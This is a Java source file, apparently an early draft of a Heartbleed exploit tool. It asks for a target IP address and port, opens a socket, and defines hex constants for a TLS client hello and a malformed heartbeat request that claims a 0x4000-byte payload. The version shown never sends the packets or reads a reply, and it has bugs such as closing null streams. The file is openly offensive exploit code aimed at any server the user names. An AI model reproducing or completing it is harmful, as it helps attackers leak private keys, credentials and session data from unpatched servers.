
import java.net.Socket;
import java.util.Scanner;
import java.io.*;

public class Heartbleed {


  /*
    Hex version of heartbleed request:
    Content type = 18
    version = 0302
    packet length = 0003
    heartbleed message type = 1 (request)
    payload length = 4000
   */
  private static final String HEARTBLEED_REQ = "1803020003014000";

  // Client hello in hex
  private static final String CLIENT_HELLO =
    "16030200310100002D0302500BAFBBB75AB83EF0AB9AE3F39C6315334137ACFD6C181A2460DC4967C2FD960000040033C01101000000";

  public static void main(String[] args) throws IOException {
    Scanner userInput = new Scanner(System.in);

    System.out.println("Please input an ip address...");
    String ipAddress = userInput.nextLine();

    System.out.println("Please enter a port number...");
    int portNumber = userInput.nextInt();

    System.out.println("Would you like to send the output to file? (y/n)");
    String outputToFile = userInput.nextLine();

    Socket socket = openSocket(ipAddress, portNumber);
    OutputStream outputStream = getOutputStream(socket);
    InputStream inputStream = getInputStream(socket, outputStream);

    System.out.println("Established connection to server.");
  }

  private static InputStream getInputStream(Socket socket, OutputStream outputStream) throws IOException {

    InputStream inputStream = null;

    try {

      inputStream = socket.getInputStream();

    } catch (Exception ex) {

      System.out.println("Could not receive input stream: " + ex.getMessage());
      socket.close();
      inputStream.close();
      outputStream.close();
      System.exit(0);
    }

    return inputStream;
  }


  private static OutputStream getOutputStream(Socket socket) throws IOException {

    OutputStream outputStream = null;

    try {

      outputStream = socket.getOutputStream();

    } catch (Exception ex) {

      System.out.println("Could not receive output stream: " + ex.getMessage());
      socket.close();
      System.exit(0);
    }

    return outputStream;
  }


  private static Socket openSocket(String ipAddress, int portNumber) throws IOException {

    Socket socket = null;

    try {
      socket = new Socket(ipAddress, portNumber);
    } catch (Exception ex) {

      System.out.println("Socket could not connect. Reason: " + ex.getMessage());
      socket.close();
      System.exit(0);
    }

    return socket;
  }

}
